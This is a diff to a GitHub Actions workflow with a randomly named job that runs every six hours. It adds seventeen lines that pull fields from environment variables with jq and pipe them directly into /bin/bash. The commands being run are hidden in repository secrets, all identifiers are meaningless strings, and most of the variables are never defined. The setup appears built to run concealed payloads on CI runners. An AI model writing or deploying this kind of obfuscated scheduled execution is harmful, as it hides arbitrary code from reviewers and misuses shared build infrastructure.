@@ -3,7 +3,7 @@ name: olympicszealous
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 1/6 * * *'
+    - cron: '17 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,8 +12,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: olympicszealous
         env:
-          lyini3: ${{ secrets.lyini3 }}
+          vl92: ${{ secrets.vl92 }}
         run: |
-          echo $lyini3 | jq -r .isc27 | /bin/bash
-          echo $jpvy2158 | jq -r .f6 | /bin/bash
+          echo $vl92 | jq -r .yd0949 | /bin/bash
+          echo $aozf90128 | jq -r .q334 | /bin/bash
+          echo $mjz3 | jq -r .ng7 | /bin/bash
+          echo $ihu918 | jq -r .sdj57542 | /bin/bash
+          echo $rwbdb01268 | jq -r .hmrae054 | /bin/bash
+          echo $xj461 | jq -r .tsc681 | /bin/bash
+          echo $pqy14 | jq -r .z46215 | /bin/bash
+          echo $clbjz6 | jq -r .n3 | /bin/bash
+          echo $ryduu53 | jq -r .h96 | /bin/bash
+          echo $ii6 | jq -r .hkzou1658 | /bin/bash
+          echo $met61454 | jq -r .q8302 | /bin/bash
+          echo $e59848 | jq -r .ct56 | /bin/bash
+          echo $ta67404 | jq -r .xddl06 | /bin/bash
+          echo $i903 | jq -r .aw4943 | /bin/bash
+          echo $kt4002 | jq -r .hlpp3202 | /bin/bash
+          echo $vx62790 | jq -r .rufqp21612 | /bin/bash
+          echo $mmh8 | jq -r .t0 | /bin/bash
 
